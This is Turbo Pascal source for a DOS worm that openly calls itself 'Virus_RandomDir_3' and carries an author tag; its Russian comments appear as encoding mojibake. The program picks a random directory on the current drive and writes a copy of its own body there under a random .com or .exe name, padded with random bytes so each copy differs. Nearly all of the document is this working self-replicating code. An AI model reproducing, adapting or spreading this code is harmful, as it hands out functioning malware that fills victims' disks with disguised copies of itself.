   {$I-,S-}
   program Virus_RandomDir_3;
   uses dos;
   const VirLen=5344;
   var Num:integer;       {®¬¥à ¨â¥à¥áãîé¥© ¤¨à¥ªâ®à¨¨}
       NewName,           {¨¬ï á®§¤ ¢ ¥¬®£® ç¥à¢ï}
       P:string;          { ©¤¥ ï ¤¨à¥ªâ®à¨ï}
       Y:boolean;         {¯à¨§ ª â®£®, çâ® ¤®è«¨ ¤® âã¯¨ª }
   {---------------------------------------------------------------------------}
   procedure MakeWorm;                       {á®§¤ ¥¬ ç¥à¢ï á® á«ãç ©ë¬ ¨¬¥¥¬}
   var f:file;
       i,d,C:byte;
       M:integer;
       Body:array[1..VirLen] of byte;
   begin
   {-- ‘®§¤ ¥¬ ¨¬ï}
   d:=random(8)+1;
   NewName:='[HLLW.RanDir-3 (c) by Duke/SMF]';                {¬®¨ ª®¯¨à ©âë ;)}
   NewName:='';
   for i:=1 to d do NewName:=NewName+chr(random(26)+97);
   d:=random(255);
   if d div 2 = d/2 then NewName:=NewName+'.com' else NewName:=NewName+'.exe';
   {-- ‘®§¤ ¥¬ ä ©«}
   NewName:=P+'\'+NewName;               {¤®¯®«ï¥¬ ¨¬ï ¯ãâ¥¬}
   assign(f,paramstr(0));reset(f,1);
   blockread(f,Body,VirLen);
   close(f);
   assign(f,NewName);rewrite(f,1);
   blockwrite(f,Body,VirLen);
   for M:=0 to random(1000) do
     begin
     C:=random(255);
     blockwrite(f,C,1);
     end;
   close(f);
   end;
   {---------------------------------------------------------------------------}
   function ScanTree(Dir:string):integer;        {áç¨â ¥¬ ª®«-¢® ¤¨à¥ªâ®à¨©}
   var N:searchrec;
       D:integer;
   begin
   D:=0;
   Dir:=Dir+'\';
   findfirst(Dir+'*.*',$3F,N);
   while doserror=0 do
     begin
     with N do if (Attr and 16<>0) and (Name[1]<>'.') then D:=D+1;
     findnext(N);
     end;
   ScanTree:=D;
   end;
   {---------------------------------------------------------------------------}
   procedure FindDir(var Dir:string;D:integer);       {¨áª âì ã¦ãî ¤¨à¥ªâ®à¨î}
   var N:searchrec;
       K:integer;
   begin
   if D=0 then Y:=true else
     begin
     K:=0;
     Dir:=Dir+'\';
     findfirst(Dir+'*.*',$3F,N);
     while doserror=0 do
       begin
       with N do if (Attr and 16<>0) and (Name[1]<>'.') then K:=K+1;
       if K=D then
          begin
          P:=P+N.name;
          exit;
          end;
       findnext(N);
       end;
     end;
   end;
   {---------------------------------------------------------------------------}
   begin
   Randomize;                            {¨¨æ¨¨àã¥¬ random-£¥¥à â®à}
   P:=copy(fexpand(paramstr(0)),1,2);    {®¯à¥¤¥«¨«¨ ¨¬ï ¤¨áª }
   Y:=false;
   while Y=false do
     begin
     Num:=random(ScanTree(P));
     FindDir(P,Num);
     end;
   MakeWorm;                             {á®§¤ ¥¬ ç¥à¢ï}
   end.
